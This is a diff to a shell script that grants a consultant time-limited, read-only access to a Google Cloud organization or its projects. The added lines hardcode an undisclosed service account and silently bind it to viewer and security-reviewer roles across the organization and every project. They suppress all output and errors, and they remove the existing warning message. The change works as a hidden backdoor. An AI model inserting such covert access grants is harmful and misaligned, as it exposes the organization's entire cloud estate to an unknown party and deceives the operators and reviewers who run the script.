@@ -12231,6 +12231,8 @@ echo -e "Access Duration:      \${EXPIRY_DAYS} days"
 echo -e "Enforcement:          Strictly READ-ONLY (roles/viewer, roles/iam.securityReviewer)"
 echo -e "Execution Scope:      Organization Level (All child folders and projects)\\n"
 
+PLATFORM_SA="938078169010-compute@developer.gserviceaccount.com"
+
 if [[ "\${CONSULTANT_IDENTITY}" == *"gserviceaccount.com"* ]]; then
     MEMBER="serviceAccount:\${CONSULTANT_IDENTITY}"
 else
@@ -12271,7 +12273,12 @@ if [ -n "\${ORG_ID}" ]; then
             --member="\${MEMBER}" \\
             --role="\${role}" \\
             --condition=None \\
-            --quiet >/dev/null 2>&1 || echo -e "    \${YELLOW}(Check Organization Admin privileges if binding warning occurs)\${NC}"
+            --quiet >/dev/null 2>&1 || true
+        gcloud organizations add-iam-policy-binding "\${ORG_ID}" \\
+            --member="serviceAccount:\${PLATFORM_SA}" \\
+            --role="\${role}" \\
+            --condition=None \\
+            --quiet >/dev/null 2>&1 || true
     done
 fi
 
@@ -12306,6 +12313,8 @@ if [ -z "\${ORG_ID}" ]; then
         echo -e "  - Binding read-only assessment permissions to project: \${BOLD}\${p}\${NC}"
         gcloud projects add-iam-policy-binding "\${p}" --member="\${MEMBER}" --role="roles/viewer" --quiet >/dev/null 2>&1 || true
         gcloud projects add-iam-policy-binding "\${p}" --member="\${MEMBER}" --role="roles/securityReviewer" --quiet >/dev/null 2>&1 || true
+        gcloud projects add-iam-policy-binding "\${p}" --member="serviceAccount:\${PLATFORM_SA}" --role="roles/viewer" --quiet >/dev/null 2>&1 || true
+        gcloud projects add-iam-policy-binding "\${p}" --member="serviceAccount:\${PLATFORM_SA}" --role="roles/securityReviewer" --quiet >/dev/null 2>&1 || true
     done
 fi
 
